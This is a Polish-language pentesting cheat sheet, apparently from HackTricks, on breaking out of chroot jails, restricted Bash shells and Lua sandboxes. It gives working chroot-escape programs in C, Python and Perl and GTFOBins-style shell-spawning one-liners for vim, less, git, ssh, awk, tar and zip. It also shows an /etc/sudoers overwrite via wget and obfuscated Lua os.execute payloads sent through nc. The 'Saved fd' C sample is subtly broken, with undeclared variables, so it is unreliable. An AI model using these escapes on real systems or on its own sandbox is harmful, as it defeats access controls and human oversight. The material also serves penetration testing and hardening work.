# Ucieczka z Jailów

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Sprawdź na stronie** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **czy możesz wykonać dowolny binary z właściwością "Shell"**

## Ucieczki z Chroot

Z [wikipedii](https://en.wikipedia.org/wiki/Chroot#Limitations): Mechanizm chroot **nie jest przeznaczony do ochrony** przed celowym manipulowaniem przez **uprzywilejowanych** (**root**) **użytkowników**. W większości systemów konteksty chroot nie działają poprawnie warstwowo, a programy uruchomione w chroot **z wystarczającymi uprawnieniami mogą wykonać drugi chroot, aby się wydostać**.\
Zwykle oznacza to, że aby uciec, musisz być rootem wewnątrz chroot.<sup>[[4]](#references)</sup>

> [!TIP]
> **Tool** [**chw00t**](https://github.com/earthquake/chw00t) został utworzony w celu wykorzystania poniższych scenariuszy i ucieczki z `chroot`.<sup>[[1]](#references)[[5]](#references)</sup>

### Root + CWD

> [!WARNING]
> Jeśli jesteś **rootem** wewnątrz chroot, **możesz się wydostać**, tworząc **kolejny chroot**. Dzieje się tak, ponieważ 2 chrooty nie mogą współistnieć (w systemie Linux), więc jeśli utworzysz folder, a następnie **utworzysz nowy chroot** w tym nowym folderze, będąc **poza nim**, znajdziesz się teraz **poza nowym chroot**, a tym samym w systemie plików.
>
> Dzieje się tak, ponieważ zazwyczaj chroot NIE przenosi bieżącego katalogu roboczego do wskazanego katalogu, więc możesz utworzyć chroot, pozostając poza nim.<sup>[[4]](#references)[[5]](#references)</sup>

Zwykle nie znajdziesz binary `chroot` wewnątrz chroot jail, ale **możesz skompilować, przesłać i uruchomić** binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Jest to podobne do poprzedniego przypadku, ale tym razem **atakujący zapisuje deskryptor pliku bieżącego katalogu**, a następnie **tworzy chroot w nowym folderze**. Ponieważ ma on **dostęp** do tego **FD** **spoza** chroota, uzyskuje do niego dostęp i **wydostaje się**.<sup>[[4]](#references)[[5]](#references)</sup>

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD może zostać przekazany przez Unix Domain Sockets, więc:
>
> - Utwórz proces potomny (fork)
> - Utwórz UDS, aby proces nadrzędny i potomny mogły się komunikować
> - Uruchom chroot w procesie potomnym w innym folderze
> - W procesie nadrzędnym utwórz FD folderu znajdującego się poza nowym chroot procesu potomnego
> - Przekaż ten FD procesowi potomnemu za pomocą UDS
> - Proces potomny wykonuje chdir do tego FD, a ponieważ znajduje się on poza jego chroot, proces wydostanie się z jaila.<sup>[[5]](#references)[[6]](#references)</sup>

### Root + Mount

> [!WARNING]
>
> - Zamontowanie urządzenia root (/) w folderze znajdującym się wewnątrz chroot
> - Wykonanie chroot do tego folderu
>
> Jest to możliwe w Linuxie.<sup>[[5]](#references)</sup>

### Root + /proc

> [!WARNING]
>
> - Zamontuj procfs w folderze znajdującym się wewnątrz chroot (jeśli nie został jeszcze zamontowany)
> - Poszukaj pid, który ma inną wartość root/cwd, na przykład: /proc/1/root
> - Wykonaj chroot do tego wpisu.<sup>[[4]](#references)[[5]](#references)[[7]](#references)</sup>

### Root(?) + Fork

> [!WARNING]
>
> - Utwórz Fork (proces potomny), wykonaj chroot do innego folderu znajdującego się głębiej w FS i wykonaj na nim CD
> - Z procesu nadrzędnego przenieś folder, w którym znajduje się proces potomny, do folderu znajdującego się przed chroot procesu potomnego
> - Ten proces potomny znajdzie się poza chroot.<sup>[[5]](#references)</sup>

### ptrace

> [!WARNING]
>
> - To, czy proces może dołączyć za pomocą `ptrace`, zależy od poświadczeń, capabilities oraz włączonych modułów bezpieczeństwa, takich jak Yama; debugowanie przez tego samego użytkownika może być zatem ograniczone przez politykę systemu.<sup>[[8]](#references)</sup>
> - Jeśli dołączenie jest dozwolone, można użyć ptrace do procesu i wykonać w nim shellcode ([zobacz ten przykład](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).<sup>[[5]](#references)[[8]](#references)</sup>

## Bash Jails

### Enumeration

Uzyskaj informacje o jailu:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Modyfikowanie PATH

Sprawdź, czy możesz modyfikować zmienną środowiskową PATH.<sup>[[2]](#references)</sup>
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Używanie vim

Jeśli Vim jest dostępny, ustaw jego opcję `shell` na powłokę, którą możesz wykonać, i wywołaj `:shell`.<sup>[[10]](#references)</sup>
```bash
:set shell=/bin/sh
:shell
```
### Programy stronicujące i przeglądarki pomocy

Wiele ograniczonych środowisk nadal udostępnia **programy stronicujące** lub **przeglądarki pomocy**. Zwykle łatwiej je wykorzystać niż próbować odbudować `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Jeśli dostępne jest `git`, jego opcja `--paginate` wysyła dane wyjściowe do `less` lub `$PAGER`, co jest przydatne, gdy dostępny jest pager escape.<sup>[[9]](#references)</sup>
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Typowe one-linery GTFOBins

Gdy już wiesz, które pliki binarne są dostępne, najpierw przetestuj oczywiste sposoby uruchamiania shellu:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Jeśli możesz tylko **wstrzykiwać argumenty** do dozwolonego polecenia (zamiast uruchamiać je bez ograniczeń), sprawdź również **GTFOArgs**.<sup>[[17]](#references)</sup>

### Tworzenie skryptu

Sprawdź, czy możesz utworzyć plik wykonywalny z zawartością _/bin/bash_
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Uzyskaj bash przez SSH

Jeśli uzyskujesz dostęp przez ssh, często możesz poprosić serwer o wykonanie **innego programu** zamiast ograniczonej powłoki logowania.<sup>[[14]](#references)</sup>
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Jeśli `ssh` jest jednym z nielicznych lokalnie dozwolonych plików binarnych, pamiętaj, że może być również nadużywany jako **GTFOBin**; jego opcje `LocalCommand` i `ProxyCommand` wykonują lokalnie skonfigurowane polecenia pomocnicze.<sup>[[14]](#references)[[15]](#references)</sup>
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declare

W Bash nameref przekierowuje przypisania do innej zmiennej, natomiast dodanie elementu do `BASH_CMDS` dodaje dane polecenie do wewnętrznej tablicy skrótów poleceń Bash.<sup>[[11]](#references)[[12]](#references)</sup>
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Opcja `-O` programu Wget zapisuje pobraną zawartość do określonego pliku wyjściowego; jeśli ta ścieżka jest zapisywalna, można w ten sposób nadpisać plik taki jak `/etc/sudoers`.<sup>[[13]](#references)</sup>
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Ograniczone wrappery shell (`git-shell`, `rssh`, `lshell`)

Niektóre środowiska nie uruchamiają zwykłego `rbash`, lecz wrappery takie jak `git-shell`, `rssh` lub `lshell`:

- `git-shell` akceptuje wyłącznie polecenia Git po stronie serwera oraz wszystko, co znajduje się w `~/git-shell-commands/`. Jeśli ten katalog istnieje, uruchom `help`, aby wyświetlić listę dozwolonych niestandardowych akcji. Jeśli możesz tam **zapisywać**, każdy plik wykonywalny umieszczony w tym katalogu stanie się dostępny.<sup>[[3]](#references)</sup>
- `rssh` / `lshell` zwykle zezwalają wyłącznie na operacje `scp`, `sftp`, `rsync` lub operacje w stylu Git. W takich przypadkach najpierw skup się na **prymitywach zapisu plików**: prześlij `authorized_keys`, plik startowy shell lub skrypt pomocniczy do lokalizacji, w której można zapisywać, a następnie połącz się ponownie za pomocą `ssh -t ...`.
- Jeśli wrapper filtruje tylko wiersz poleceń, wylicz dostępne pliki binarne, a następnie przejdź do **GTFOBins / GTFOArgs**.

### Inne triki

Sprawdź również:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Interesująca może być również strona:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Triki dotyczące escaping z Python Jails znajdują się na następującej stronie:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Na tej stronie znajdziesz globalne funkcje, do których masz dostęp wewnątrz Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base).<sup>[[16]](#references)</sup>

Standardowe funkcje `load`, `string.char` i `os.execute` mogą zbudować i uruchomić ten fragment kodu, jeśli są dostępne.<sup>[[16]](#references)</sup>
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Funkcję tabeli można również pobrać za pomocą `rawget` zamiast składni kropkowej.<sup>[[16]](#references)</sup>
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Użyj `pairs`, aby wyliczyć elementy tabeli biblioteki.<sup>[[16]](#references)</sup>
```bash
for k,v in pairs(string) do print(k,v) end
```
Kolejność, w której `pairs` wylicza indeksy tabeli, jest nieokreślona, więc nie należy zakładać, że konkretna funkcja pojawi się jako pierwsza. Jeśli chcesz wykonać jedną konkretną funkcję, możesz przeprowadzić brute force attack, wczytując różne środowiska Lua i wywołując pierwszą funkcję biblioteki.<sup>[[16]](#references)</sup>
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Uzyskaj interaktywny lua shell**: Jeśli znajdujesz się w ograniczonym lua shellu, możesz uzyskać nowy lua shell (i miejmy nadzieję, że nieograniczony), wywołując `debug.debug()`, co uruchamia tryb interaktywny.<sup>[[16]](#references)</sup>
```bash
debug.debug()
```
## References

- [1] [Chw00t: Jak wydostać się z różnych rozwiązań chroot (Bucsay Balazs, prezentacja i slajdy DeepSec)](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [Podręcznik GNU Bash Reference Manual – Restricted Shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Dokumentacja Git](https://git-scm.com/docs/git-shell)
- [4] [chroot(2) – strona podręcznika Linux](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [5] [chw00t – narzędzie do chroot escape](https://github.com/earthquake/chw00t)
- [6] [unix(7) – strona podręcznika Linux](https://man7.org/linux/man-pages/man7/unix.7.html)
- [7] [proc_pid_root(5) – strona podręcznika Linux](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [8] [ptrace(2) – strona podręcznika Linux](https://man7.org/linux/man-pages/man2/ptrace.2.html)
- [9] [git – Dokumentacja Git](https://git-scm.com/docs/git)
- [10] [:shell – dokumentacja Vim](https://vimhelp.org/various.txt.html#%3Ashell)
- [11] [Wbudowane elementy Bash – Podręcznik GNU Bash Reference Manual](https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html)
- [12] [Zmienne Bash – Podręcznik GNU Bash Reference Manual](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [13] [Podręcznik GNU Wget](https://www.gnu.org/software/wget/manual/wget.html)
- [14] [ssh(1) – strona podręcznika OpenBSD](https://man.openbsd.org/ssh)
- [15] [ssh_config(5) – strona podręcznika OpenBSD](https://man.openbsd.org/ssh_config)
- [16] [Podręcznik referencyjny Lua 5.4](https://www.lua.org/manual/5.4/manual.html)
- [17] [GTFOArgs: Lista wektorów exploitacji Argument Injection](https://gtfoargs.github.io/)
{{#include ../../banners/hacktricks-training.md}}
